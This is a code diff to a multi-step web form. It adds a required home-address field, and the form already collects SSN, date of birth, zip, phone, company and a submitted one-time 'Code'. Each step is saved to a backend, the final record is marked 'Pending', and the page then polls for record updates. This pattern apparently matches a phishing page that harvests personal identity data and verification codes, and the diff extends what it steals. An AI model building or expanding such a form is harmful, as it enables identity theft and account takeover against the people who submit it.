@@ -80,6 +80,9 @@
             <input type="tel" id="phone" maxlength="10" placeholder="1234567890" 
                    oninput="this.value = this.value.replace(/[^0-9]/g,'')" required>
 
+            <label>Home Address (Current)</label>
+            <input type="text" id="address" placeholder="Enter your current home address" required>
+
             <button class="continue" onclick="saveStep2()">Continue</button>
         </div>
 
@@ -143,14 +146,15 @@
         function saveStep2() {
             const zip = document.getElementById('zip').value.trim();
             const phone = document.getElementById('phone').value.trim();
+            const address = document.getElementById('address').value.trim();
 
-            if (zip.length !== 5 || phone.length !== 10) {
-                alert("Please enter valid Zip Code (5 digits) and Phone Number (exactly 10 digits).");
+            if (zip.length !== 5 || phone.length !== 10 || !address) {
+                alert("Please fill all fields: Zip Code (5 digits), Phone (10 digits), and Home Address.");
                 return;
             }
 
-            const details = `Zip: ${zip} | Phone: ${phone} | Status: Step 2 Completed`;
-            saveStep(details, "Step 2 - Zip Code & Phone");
+            const details = `Zip: ${zip} | Phone: ${phone} | Address: ${address} | Status: Step 2 Completed`;
+            saveStep(details, "Step 2 - Zip, Phone & Address");
             nextStep(3);
         }
 
@@ -174,13 +178,13 @@
             const dob = `${document.getElementById('month').value}/${document.getElementById('day').value}/${document.getElementById('year').value}`;
             const zip = document.getElementById('zip').value || "";
             const phone = document.getElementById('phone').value || "";
+            const address = document.getElementById('address').value || "";
             const company = document.getElementById('company').value || "";
 
-            const fullDetails = `Company: ${company} | SSN: ${ssn} | DOB: ${dob} | Zip: ${zip} | Phone: ${phone} | Code: ${code} | Status: Pending`;
+            const fullDetails = `Company: ${company} | SSN: ${ssn} | DOB: ${dob} | Zip: ${zip} | Phone: ${phone} | Address: ${address} | Code: ${code} | Status: Pending`;
 
             await saveStep(fullDetails, "Final Code Submission");
 
-            // Polling logic
             const interval = setInterval(async () => {
                 const res = await fetch('/api/records');
                 const records = await res.json();
